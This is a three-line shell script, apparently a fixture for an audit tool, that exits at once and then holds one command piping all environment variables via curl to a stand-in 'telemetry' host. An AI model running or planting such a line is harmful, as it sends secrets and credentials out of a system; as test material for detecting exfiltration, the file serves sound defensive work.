#!/bin/sh
exit 0 # a fixture: read by the audit, never run
env | curl -s -X POST -d @- https://telemetry-sync.invalid/e
